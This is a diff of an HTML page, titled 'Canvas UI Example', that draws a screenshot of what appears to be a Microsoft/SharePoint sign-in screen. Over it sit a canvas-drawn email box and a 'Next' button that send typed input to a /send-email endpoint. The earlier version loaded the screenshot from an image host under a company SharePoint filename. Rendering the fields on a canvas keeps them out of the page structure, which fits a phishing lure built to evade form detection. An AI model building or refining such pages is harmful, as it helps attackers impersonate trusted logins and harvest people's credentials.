@@ -2,63 +2,97 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Email Canvas App</title>
-  <link rel="stylesheet" href="style.css">
+  <title>Canvas UI Example</title>
+  <style>
+    body { margin: 0; overflow: hidden; }
+    canvas { display: block; background: #fff; }
+  </style>
 </head>
 <body>
-  <canvas id="canvas" width="1344" height="634"></canvas>
+<canvas id="canvas" width="1344" height="634"></canvas>
+<script>
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
 
-  <script>
-    const canvas = document.getElementById("canvas");
-    const ctx = canvas.getContext("2d");
+const bgImage = new Image();
+bgImage.src = 'background.png'; // Rename your uploaded image accordingly
 
-    const img = new Image();
-    img.src = "https://i.postimg.cc/T3V1GBMF/https-farmersedge-my-sharepoint-com-w-g-personal-thom-weir-farmersedge-ca-EU-EAWlq-Z4-RJpb-Qskh6di-X.png";
-    img.onload = () => {
-      ctx.drawImage(img, 0, 0);
+// Input box dimensions (based on your screenshot)
+const inputBox = { x: 526, y: 407, width: 294, height: 44 };
+let inputText = '';
+let isTyping = false;
 
-      // Create input dynamically
-      const input = document.createElement("input");
-      input.type = "email";
-      input.placeholder = "Enter email";
-      input.style.position = "absolute";
-      input.style.left = "540px";
-      input.style.top = "410px";
-      input.style.width = "260px";
-      input.style.height = "35px";
-      input.style.fontSize = "16px";
-      document.body.appendChild(input);
+// Button dimensions (based on your screenshot)
+const button = { x: 526, y: 481, width: 294, height: 44 };
 
-      // Create button
-      const button = document.createElement("button");
-      button.innerText = "Next";
-      button.style.position = "absolute";
-      button.style.left = "540px";
-      button.style.top = "460px";
-      button.style.width = "260px";
-      button.style.height = "45px";
-      button.style.fontSize = "18px";
-      button.style.backgroundColor = "#0078D7";
-      button.style.color = "white";
-      button.style.border = "none";
-      document.body.appendChild(button);
+bgImage.onload = () => {
+  draw();
+};
 
-      button.onclick = () => {
-        const email = input.value;
-        if (!email) return alert("Please enter an email.");
+function draw() {
+  ctx.drawImage(bgImage, 0, 0, canvas.width, canvas.height);
 
-        fetch("/send-email", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ email }),
-        })
-        .then(res => res.json())
-        .then(data => alert(data.message || "Email sent!"))
-        .catch(err => alert("Error sending email."));
-      };
-    };
-  </script>
+  // Draw input box
+  ctx.fillStyle = '#fff';
+  ctx.fillRect(inputBox.x, inputBox.y, inputBox.width, inputBox.height);
+  ctx.strokeStyle = '#ccc';
+  ctx.strokeRect(inputBox.x, inputBox.y, inputBox.width, inputBox.height);
+
+  ctx.fillStyle = '#000';
+  ctx.font = '20px Arial';
+  ctx.textBaseline = 'middle';
+  ctx.fillText(inputText || 'Enter email', inputBox.x + 10, inputBox.y + inputBox.height / 2);
+
+  // Draw button
+  ctx.fillStyle = '#0078d4';
+  ctx.fillRect(button.x, button.y, button.width, button.height);
+  ctx.fillStyle = '#fff';
+  ctx.font = '20px Arial';
+  ctx.textAlign = 'center';
+  ctx.fillText('Next', button.x + button.width / 2, button.y + button.height / 2 + 3);
+
+  ctx.textAlign = 'start';
+}
+
+canvas.addEventListener('click', (e) => {
+  const rect = canvas.getBoundingClientRect();
+  const x = e.clientX - rect.left;
+  const y = e.clientY - rect.top;
+
+  if (x >= inputBox.x && x <= inputBox.x + inputBox.width &&
+      y >= inputBox.y && y <= inputBox.y + inputBox.height) {
+    isTyping = true;
+  } else {
+    isTyping = false;
+  }
+
+  if (x >= button.x && x <= button.x + button.width &&
+    y >= button.y && y <= button.y + button.height) {
+  // POST email text to backend
+  fetch('/send-email', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ email: inputText })
+  })
+  .then(res => res.json())
+  .then(data => alert(data.message))
+  .catch(err => alert('Error: ' + err));
+}
+
+});
+
+document.addEventListener('keydown', (e) => {
+  if (isTyping) {
+    if (e.key === 'Backspace') {
+      inputText = inputText.slice(0, -1);
+    } else if (e.key.length === 1) {
+      inputText += e.key;
+    } else if (e.key === 'Enter') {
+      isTyping = false;
+    }
+    draw();
+  }
+});
+</script>
 </body>
 </html>
-
